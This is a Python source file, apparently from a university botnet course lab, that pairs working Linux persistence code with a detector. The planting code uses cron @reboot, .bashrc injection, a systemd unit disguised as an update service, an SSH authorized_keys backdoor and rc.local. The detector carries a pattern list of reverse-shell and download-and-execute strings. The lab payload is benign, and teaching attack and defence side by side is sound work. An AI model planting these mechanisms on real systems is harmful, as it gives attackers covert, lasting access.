"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Persistence Simulation (Linux)
 Environment: ISOLATED VM LAB ONLY
====================================================

Teaching points:
  The Advanced Botnet resource used Windows Startup folder and
  Registry Run keys. This module implements the Linux equivalents,
  all of which are well-documented MITRE ATT&CK techniques.

  Key research finding (mirrors Graph 2 / Persistence Paradox):
  System wipes remove all persistence mechanisms — but if the
  underlying vulnerability (default SSH credentials, open Telnet)
  is not patched, the bot re-establishes persistence within
  minutes of reboot via re-infection. Ephemerality is not a
  substitute for root-cause hardening.

Attack side (PersistencePlanter):
  Demonstrates five Linux persistence techniques in isolated lab:
    1. Cron job         — @reboot or scheduled interval
    2. ~/.bashrc inject  — runs on every user login shell
    3. Systemd unit      — survives reboots via service manager
    4. SSH authorized_keys — passwordless re-entry
    5. /etc/rc.local     — legacy init hook

  All writes are to the VICTIM VM only (192.168.100.20).
  All methods are fully reversible via --remove.

Defense side (PersistenceDetector — IDS Engine 18):
  Monitors for the file-write artifacts of persistence installation:
    - New crontab entry or cron.d file
    - Writes to ~/.bashrc, ~/.bash_profile, ~/.profile
    - New or modified systemd unit in ~/.config/systemd/user/
      or /etc/systemd/system/
    - New entries in ~/.ssh/authorized_keys
    - Modification of /etc/rc.local

  Uses inotify (pyinotify) if available; falls back to periodic
  hash-based file integrity checking (poor man's AIDE).

MITRE: T1053.003 (Cron), T1546.004 (bashrc), T1543.002 (systemd),
       T1098.004 (SSH authorized_keys), T1037.004 (rc.local)

CLI:
  python3 persistence_sim.py --plant   [--method METHOD] [--target IP]
  python3 persistence_sim.py --remove  [--method METHOD] [--target IP]
  python3 persistence_sim.py --detect                (IDS demo)
  python3 persistence_sim.py --list                  (show installed)
  python3 persistence_sim.py --demo                  (full demo, localhost)
"""

import os
import sys
import time
import json
import stat
import hashlib
import shutil
import socket
import threading
import subprocess
from datetime import datetime
from collections import defaultdict
from pathlib import Path

try:
    import psutil
    PSUTIL_OK = True
except ImportError:
    PSUTIL_OK = False


# ════════════════════════════════════════════════════════════════
#  SHARED UTILITIES
# ════════════════════════════════════════════════════════════════

def _sha256_file(path: str) -> str:
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()
    except (FileNotFoundError, PermissionError):
        return ""


def _default_alert(engine, severity, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n{'='*60}\n  ALERT [{severity}]  {engine}  @ {ts}\n  {msg}\n{'='*60}\n")

_alert_fn = _default_alert

def register_alert_fn(fn):
    global _alert_fn
    _alert_fn = fn


# ════════════════════════════════════════════════════════════════
#  ATTACK SIDE: Persistence Planter
# ════════════════════════════════════════════════════════════════

# The payload in lab mode is benign — it writes a timestamped marker
# to /tmp/persistence_check.log so we can verify the mechanism works.
LAB_PAYLOAD_CMD = (
    "echo \"[BOTNET-LAB] Persistence executed: $(date)\" "
    ">> /tmp/persistence_check.log"
)

# Unique marker so we can surgically remove our entries later
MARKER = "# AUA_BOTNET_LAB_PERSISTENCE"


class PersistencePlanter:
    """
    Plants and removes persistence mechanisms in the lab VM.

    ISOLATION REQUIREMENT: run only against 192.168.100.20
    or localhost inside the isolated VM network.

    All planted entries write a benign log line — no payload
    execution, no network callbacks, no data exfiltration.
    """

    METHODS = ["cron", "bashrc", "systemd", "authorized_keys", "rclocal"]

    def __init__(self, target_home: str = None):
        self.home = target_home or os.path.expanduser("~")
        self.results: list[dict] = []

    # ── Method 1: Cron Job ────────────────────────────────────
    def plant_cron(self) -> dict:
        """
        @reboot cron entry — executes payload once after every reboot.
        Most resilient: survives shell config changes, systemd restarts.
        MITRE: T1053.003
        """
        cron_line = f"@reboot {LAB_PAYLOAD_CMD}  {MARKER}\n"
        try:
            existing = subprocess.check_output(
                ["crontab", "-l"],
                stderr=subprocess.DEVNULL
            ).decode()
        except subprocess.CalledProcessError:
            existing = ""

        if MARKER in existing:
            return {"method": "cron", "status": "already_planted"}

        new_crontab = existing + cron_line
        proc = subprocess.run(
            ["crontab", "-"],
            input=new_crontab.encode(),
            capture_output=True,
        )
        ok = proc.returncode == 0
        return {
            "method": "cron",
            "status": "planted" if ok else "failed",
            "entry":  cron_line.strip(),
            "mitre":  "T1053.003",
        }

    def remove_cron(self) -> dict:
        try:
            existing = subprocess.check_output(
                ["crontab", "-l"],
                stderr=subprocess.DEVNULL
            ).decode()
        except subprocess.CalledProcessError:
            return {"method": "cron", "status": "not_found"}

        new_crontab = "\n".join(
            line for line in existing.splitlines()
            if MARKER not in line
        ) + "\n"
        subprocess.run(["crontab", "-"], input=new_crontab.encode(),
                       capture_output=True)
        return {"method": "cron", "status": "removed"}

    # ── Method 2: ~/.bashrc Injection ────────────────────────
    def plant_bashrc(self) -> dict:
        """
        Appends a command to ~/.bashrc.
        Executes whenever the user opens an interactive shell.
        MITRE: T1546.004
        """
        bashrc = os.path.join(self.home, ".bashrc")
        entry  = f"\n{MARKER}\n{LAB_PAYLOAD_CMD}\n"

        try:
            with open(bashrc, "r") as f:
                content = f.read()
            if MARKER in content:
                return {"method": "bashrc", "status": "already_planted"}
            with open(bashrc, "a") as f:
                f.write(entry)
            return {
                "method": "bashrc",
                "status": "planted",
                "file":   bashrc,
                "mitre":  "T1546.004",
            }
        except Exception as e:
            return {"method": "bashrc", "status": "failed", "error": str(e)}

    def remove_bashrc(self) -> dict:
        bashrc = os.path.join(self.home, ".bashrc")
        try:
            with open(bashrc, "r") as f:
                lines = f.readlines()
            clean = []
            skip_next = False
            for line in lines:
                if MARKER in line:
                    skip_next = True
                    continue
                if skip_next:
                    skip_next = False
                    continue
                clean.append(line)
            with open(bashrc, "w") as f:
                f.writelines(clean)
            return {"method": "bashrc", "status": "removed"}
        except Exception as e:
            return {"method": "bashrc", "status": "failed", "error": str(e)}

    # ── Method 3: Systemd User Unit ──────────────────────────
    def plant_systemd(self) -> dict:
        """
        Installs a systemd user service that starts on login.
        More sophisticated: survives shell resets, harder to spot.
        MITRE: T1543.002
        """
        unit_dir  = Path(self.home) / ".config" / "systemd" / "user"
        unit_dir.mkdir(parents=True, exist_ok=True)
        unit_path = unit_dir / "botnet_lab.service"

        unit_content = f"""\
[Unit]
Description=System Update Service  {MARKER}
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c '{LAB_PAYLOAD_CMD}'
RemainAfterExit=yes

[Install]
WantedBy=default.target
"""
        try:
            with open(unit_path, "w") as f:
                f.write(unit_content)
            # Enable the unit (creates symlink in wants/)
            subprocess.run(
                ["systemctl", "--user", "enable", "botnet_lab.service"],
                capture_output=True,
            )
            return {
                "method":    "systemd",
                "status":    "planted",
                "unit_file": str(unit_path),
                "mitre":     "T1543.002",
            }
        except Exception as e:
            return {"method": "systemd", "status": "failed", "error": str(e)}

    def remove_systemd(self) -> dict:
        unit_path = (
            Path(self.home) / ".config" / "systemd" / "user" / "botnet_lab.service"
        )
        try:
            subprocess.run(
                ["systemctl", "--user", "disable", "--now", "botnet_lab.service"],
                capture_output=True,
            )
            if unit_path.exists():
                unit_path.unlink()
            return {"method": "systemd", "status": "removed"}
        except Exception as e:
            return {"method": "systemd", "status": "failed", "error": str(e)}

    # ── Method 4: SSH authorized_keys ────────────────────────
    def plant_authorized_keys(self, public_key: str = None) -> dict:
        """
        Adds an SSH public key for passwordless re-entry.
        Used after initial access to maintain persistence even
        if the compromised password is changed.
        In the lab: generates a throwaway key pair and adds it.
        MITRE: T1098.004
        """
        ssh_dir  = Path(self.home) / ".ssh"
        ssh_dir.mkdir(mode=0o700, exist_ok=True)
        auth_keys = ssh_dir / "authorized_keys"

        if public_key is None:
            # Generate throwaway keypair for lab demo
            key_file = "/tmp/botnet_lab_key"
            subprocess.run(
                ["ssh-keygen", "-t", "ed25519", "-f", key_file,
                 "-N", "", "-C", f"botnet_lab {MARKER}"],
                capture_output=True, check=False,
            )
            try:
                with open(f"{key_file}.pub") as f:
                    public_key = f.read().strip()
            except FileNotFoundError:
                return {
                    "method": "authorized_keys",
                    "status": "failed",
                    "error": "ssh-keygen not available",
                }

        if MARKER in public_key or "botnet_lab" in public_key:
            # Lab key has the marker in comment field — safe to track
            pass

        try:
            existing = ""
            if auth_keys.exists():
                with open(auth_keys) as f:
                    existing = f.read()

            if MARKER in existing or "botnet_lab" in existing:
                return {"method": "authorized_keys", "status": "already_planted"}

            with open(auth_keys, "a") as f:
                f.write(f"\n{public_key}  {MARKER}\n")

            auth_keys.chmod(0o600)
            return {
                "method":    "authorized_keys",
                "status":    "planted",
                "key_file":  str(auth_keys),
                "pub_key":   public_key[:40] + "...",
                "mitre":     "T1098.004",
            }
        except Exception as e:
            return {
                "method": "authorized_keys",
                "status": "failed",
                "error":  str(e),
            }

    def remove_authorized_keys(self) -> dict:
        auth_keys = Path(self.home) / ".ssh" / "authorized_keys"
        try:
            if not auth_keys.exists():
                return {"method": "authorized_keys", "status": "not_found"}
            with open(auth_keys, "r") as f:
                lines = f.readlines()
            clean = [l for l in lines
                     if MARKER not in l and "botnet_lab" not in l]
            with open(auth_keys, "w") as f:
                f.writelines(clean)
            # Remove throwaway keypair
            for f in ["/tmp/botnet_lab_key", "/tmp/botnet_lab_key.pub"]:
                try:
                    os.unlink(f)
                except FileNotFoundError:
                    pass
            return {"method": "authorized_keys", "status": "removed"}
        except Exception as e:
            return {"method": "authorized_keys", "status": "failed",
                    "error": str(e)}

    # ── Method 5: /etc/rc.local (requires root) ──────────────
    def plant_rclocal(self) -> dict:
        """
        Adds an entry to /etc/rc.local (legacy init hook).
        Requires root. Executes at system boot before login prompt.
        MITRE: T1037.004
        """
        rclocal = "/etc/rc.local"
        if not os.path.exists(rclocal):
            # Create a minimal rc.local
            stub = "#!/bin/bash\nexit 0\n"
            try:
                with open(rclocal, "w") as f:
                    f.write(stub)
                os.chmod(rclocal, 0o755)
            except PermissionError:
                return {
                    "method": "rclocal",
                    "status": "failed",
                    "error":  "requires root — run with sudo",
                }

        entry = f"{LAB_PAYLOAD_CMD}  {MARKER}"
        try:
            with open(rclocal, "r") as f:
                content = f.read()
            if MARKER in content:
                return {"method": "rclocal", "status": "already_planted"}

            # Insert before the final 'exit 0'
            if "exit 0" in content:
                content = content.replace("exit 0", f"{entry}\nexit 0", 1)
            else:
                content += f"\n{entry}\n"

            with open(rclocal, "w") as f:
                f.write(content)
            return {
                "method":  "rclocal",
                "status":  "planted",
                "file":    rclocal,
                "mitre":   "T1037.004",
            }
        except PermissionError:
            return {
                "method": "rclocal",
                "status": "failed",
                "error":  "requires root — run with sudo",
            }

    def remove_rclocal(self) -> dict:
        rclocal = "/etc/rc.local"
        try:
            with open(rclocal, "r") as f:
                lines = f.readlines()
            clean = [l for l in lines if MARKER not in l]
            with open(rclocal, "w") as f:
                f.writelines(clean)
            return {"method": "rclocal", "status": "removed"}
        except (FileNotFoundError, PermissionError) as e:
            return {"method": "rclocal", "status": "failed", "error": str(e)}

    # ── Master plant / remove ─────────────────────────────────

    def plant_all(self, methods: list = None) -> list:
        methods = methods or self.METHODS
        results = []
        method_map = {
            "cron":              self.plant_cron,
            "bashrc":            self.plant_bashrc,
            "systemd":           self.plant_systemd,
            "authorized_keys":   self.plant_authorized_keys,
            "rclocal":           self.plant_rclocal,
        }
        for m in methods:
            if m in method_map:
                result = method_map[m]()
                results.append(result)
                print(f"[Persistence] {m}: {result['status']}")
        self.results = results
        return results

    def remove_all(self, methods: list = None) -> list:
        methods = methods or self.METHODS
        results = []
        method_map = {
            "cron":             self.remove_cron,
            "bashrc":           self.remove_bashrc,
            "systemd":          self.remove_systemd,
            "authorized_keys":  self.remove_authorized_keys,
            "rclocal":          self.remove_rclocal,
        }
        for m in methods:
            if m in method_map:
                result = method_map[m]()
                results.append(result)
                print(f"[Persistence] REMOVE {m}: {result['status']}")
        return results


# ════════════════════════════════════════════════════════════════
#  DEFENSE SIDE: Persistence Detector (IDS Engine 18)
# ════════════════════════════════════════════════════════════════

class PersistenceDetector:
    """
    IDS Engine 18 — Persistence Mechanism Detection.

    Two detection strategies:

    Strategy A — Hash-based File Integrity Monitoring (FIM):
      Baselines watched files/directories on startup.
      Alerts on any modification. Analogous to AIDE/Tripwire
      but lightweight and specific to persistence locations.

    Strategy B — Content-pattern Scanning:
      Periodically reads watched files and searches for
      suspicious content patterns (reverse shell commands,
      base64 blobs, unusual network callbacks).

    MITRE: T1053.003, T1546.004, T1543.002, T1098.004, T1037.004
    """

    WATCHED_FILES = [
        os.path.expanduser("~/.bashrc"),
        os.path.expanduser("~/.bash_profile"),
        os.path.expanduser("~/.profile"),
        os.path.expanduser("~/.zshrc"),
        "/etc/rc.local",
        "/etc/crontab",
        "/etc/environment",
        "/etc/profile",
    ]

    WATCHED_DIRS = [
        "/etc/cron.d",
        "/etc/cron.daily",
        "/etc/cron.hourly",
        "/etc/cron.weekly",
        "/etc/systemd/system",
        os.path.expanduser("~/.config/systemd/user"),
        os.path.expanduser("~/.ssh"),
    ]

    # Patterns in persistence files that indicate malicious content
    SUSPICIOUS_PATTERNS = [
        b"bash -i",                  # interactive reverse shell
        b"/dev/tcp/",                # bash TCP redirect
        b"nc -e",                    # netcat execute
        b"ncat ",                    # ncat
        b"python -c",                # python one-liner
        b"python3 -c",
        b"perl -e",                  # perl one-liner
        b"curl | bash",              # download-and-exec
        b"wget -O- | bash",
        b"wget -O - | sh",
        b"base64 -d |",              # encoded payload
        b"|bash\n",
        b"|sh\n",
        b"0.0.0.0",                  # binding all interfaces
        b"XYZ",                      # placeholder for C2 IP pattern
    ]

    def __init__(self, scan_interval: float = 30.0):
        self._scan_interval = scan_interval
        self._baselines: dict[str, str] = {}   # path → sha256
        self._dir_baselines: dict[str, set] = {}  # dir → set of filenames
        self._alert_cooldown: dict[str, float] = {}
        self._lock = threading.Lock()

    def _cooldown_ok(self, key: str, secs: float = 180.0) -> bool:
        now = time.time()
        if now - self._alert_cooldown.get(key, 0) >= secs:
            self._alert_cooldown[key] = now
            return True
        return False

    def baseline(self):
        """Capture current state of all watched files and directories."""
        with self._lock:
            for path in self.WATCHED_FILES:
                self._baselines[path] = _sha256_file(path)

            for d in self.WATCHED_DIRS:
                if os.path.isdir(d):
                    try:
                        self._dir_baselines[d] = set(os.listdir(d))
                    except PermissionError:
                        self._dir_baselines[d] = set()
                else:
                    self._dir_baselines[d] = set()

        print(f"[IDS-E18] Persistence baseline captured "
              f"({len(self._baselines)} files, "
              f"{len(self._dir_baselines)} dirs)")

    def _scan_once(self):
        """Run one scan cycle and fire alerts on changes."""
        # File modification check
        for path in self.WATCHED_FILES:
            current = _sha256_file(path)
            if not current:
                continue
            with self._lock:
                baseline = self._baselines.get(path)
            if baseline and current != baseline:
                if self._cooldown_ok(f"fim_{path}"):
                    mitre_map = {
                        ".bashrc": "T1546.004",
                        ".bash_profile": "T1546.004",
                        ".profile": "T1546.004",
                        ".zshrc": "T1546.004",
                        "rc.local": "T1037.004",
                        "crontab": "T1053.003",
                    }
                    basename = os.path.basename(path)
                    mitre = next(
                        (v for k, v in mitre_map.items() if k in path),
                        "T1053"
                    )
                    _alert_fn(
                        "Persistence/FIM", "HIGH",
                        f"PERSISTENCE MECHANISM INSTALLED: file modified\n"
                        f"  File:   {path}\n"
                        f"  Old hash: {baseline[:16]}...\n"
                        f"  New hash: {current[:16]}...\n"
                        f"  Common technique: botnet appends commands to "
                        f"shell startup files.\n"
                        f"  MITRE: {mitre}"
                    )
                with self._lock:
                    self._baselines[path] = current

        # Directory new-file check
        for d, baseline_files in list(self._dir_baselines.items()):
            if not os.path.isdir(d):
                continue
            try:
                current_files = set(os.listdir(d))
            except PermissionError:
                continue
            new_files = current_files - baseline_files
            for fname in new_files:
                fpath = os.path.join(d, fname)
                if self._cooldown_ok(f"newfile_{fpath}"):
                    mitre = "T1543.002" if "systemd" in d else "T1053.003"
                    suffix = ".service" if "systemd" in d else ""
                    _alert_fn(
                        "Persistence/NewFile", "HIGH",
                        f"PERSISTENCE FILE CREATED: new file in persistence dir\n"
                        f"  Directory: {d}\n"
                        f"  New file:  {fname}\n"
                        f"  {'Systemd unit files are used for service-based persistence.' if suffix else 'Cron drop-in files execute on a schedule.'}\n"
                        f"  MITRE: {mitre}"
                    )
            with self._lock:
                self._dir_baselines[d] = current_files

        # authorized_keys monitoring
        ak_path = os.path.expanduser("~/.ssh/authorized_keys")
        current = _sha256_file(ak_path)
        if current:
            with self._lock:
                baseline = self._baselines.get(ak_path)
            if baseline and current != baseline:
                if self._cooldown_ok(f"fim_{ak_path}"):
                    _alert_fn(
                        "Persistence/SSHKey", "CRITICAL",
                        f"SSH AUTHORIZED_KEY MODIFIED: new key may provide backdoor\n"
                        f"  File: {ak_path}\n"
                        f"  A new SSH public key grants passwordless access even\n"
                        f"  after the original compromised password is changed.\n"
                        f"  MITRE: T1098.004 (Account Manipulation: SSH Authorized Keys)"
                    )
            with self._lock:
                self._baselines[ak_path] = current

        # Content pattern scan
        self._scan_content()

    def _scan_content(self):
        """Search file contents for known-bad persistence patterns."""
        for path in self.WATCHED_FILES:
            try:
                with open(path, "rb") as f:
                    content = f.read()
            except (FileNotFoundError, PermissionError):
                continue
            for pattern in self.SUSPICIOUS_PATTERNS:
                if pattern in content:
                    if self._cooldown_ok(f"content_{path}_{pattern[:8]}"):
                        _alert_fn(
                            "Persistence/SuspiciousContent", "HIGH",
                            f"SUSPICIOUS CONTENT in persistence file: {path}\n"
                            f"  Pattern: {pattern.decode(errors='replace')!r}\n"
                            f"  This pattern commonly appears in reverse shell "
                            f"or C2 callback persistence entries.\n"
                            f"  MITRE: T1546.004"
                        )

    def start_monitoring(self) -> threading.Thread:
        """Baseline and start background monitoring loop."""
        self.baseline()

        def _loop():
            while True:
                time.sleep(self._scan_interval)
                try:
                    self._scan_once()
                except Exception as e:
                    print(f"[IDS-E18] Scan error: {e}")

        t = threading.Thread(target=_loop, daemon=True,
                             name="persistence-monitor")
        t.start()
        print(f"[IDS-E18] Persistence monitor started "
              f"(scan every {self._scan_interval}s)")
        return t

    def run_demo(self):
        """Demo: plant a benign marker, detect it, remove it."""
        print("[IDS-E18] Demo: Planting benign test entry in /tmp/test_bashrc ...")
        test_path = "/tmp/test_bashrc"
        with open(test_path, "w") as f:
            f.write("# Original content\n")

        # Baseline
        self._baselines[test_path] = _sha256_file(test_path)

        # Simulate modification
        with open(test_path, "a") as f:
            f.write(f"\necho 'c2_callback' | bash\n")

        # Detect
        current = _sha256_file(test_path)
        if current != self._baselines[test_path]:
            _alert_fn(
                "Persistence/FIM-DEMO", "HIGH",
                f"PERSISTENCE DEMO: detected modification of {test_path}\n"
                f"  This simulates a botnet appending a C2 callback to ~/.bashrc\n"
                f"  MITRE: T1546.004"
            )

        # Cleanup
        os.unlink(test_path)
        print("[IDS-E18] Demo complete. Test file cleaned up.")


# ════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description="Persistence Simulation — Attack + Defense")
    parser.add_argument("--plant",  action="store_true",
                        help="Plant persistence mechanisms (LAB ONLY)")
    parser.add_argument("--remove", action="store_true",
                        help="Remove all planted persistence")
    parser.add_argument("--method", type=str, default=None,
                        help="Specific method: cron|bashrc|systemd|authorized_keys|rclocal")
    parser.add_argument("--detect", action="store_true",
                        help="Run persistence detector demo")
    parser.add_argument("--list",   action="store_true",
                        help="List watched files and dirs")
    parser.add_argument("--demo",   action="store_true",
                        help="Full attack+defense demo (localhost only)")
    args = parser.parse_args()

    planter  = PersistencePlanter()
    detector = PersistenceDetector()

    if args.list:
        print("Watched files:")
        for f in PersistenceDetector.WATCHED_FILES:
            exists = "✓" if os.path.exists(f) else "✗"
            print(f"  {exists} {f}")
        print("\nWatched dirs:")
        for d in PersistenceDetector.WATCHED_DIRS:
            exists = "✓" if os.path.isdir(d) else "✗"
            print(f"  {exists} {d}")

    if args.plant:
        methods = [args.method] if args.method else None
        print("[Persistence] Planting mechanisms (lab demo)...")
        results = planter.plant_all(methods)
        print(json.dumps(results, indent=2))

    if args.remove:
        methods = [args.method] if args.method else None
        print("[Persistence] Removing all planted mechanisms...")
        results = planter.remove_all(methods)
        print(json.dumps(results, indent=2))

    if args.detect or args.demo:
        detector.run_demo()

    if args.demo and not args.plant:
        print("\n[Demo] Now planting with detection active...")
        detector.baseline()
        planter.plant_bashrc()
        time.sleep(1)
        detector._scan_once()
        planter.remove_bashrc()
        print("[Demo] Cleaned up.")
